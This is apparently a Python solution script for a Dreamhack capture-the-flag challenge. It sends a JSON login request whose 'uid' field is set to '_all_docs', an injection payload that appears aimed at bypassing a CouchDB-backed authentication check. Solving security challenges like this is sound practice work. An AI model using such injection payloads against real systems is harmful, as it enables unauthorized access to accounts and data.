import requests
import json

url = "http://host8.dreamhack.games:13765/auth"
headers = {
    "Content-Type": "application/json"
}
data = {
    "uid": "_all_docs"
}

response = requests.post(url, headers=headers, data=json.dumps(data))

# 결과 출력
print("응답 코드:", response.status_code)
print("응답 본문:", response.text)
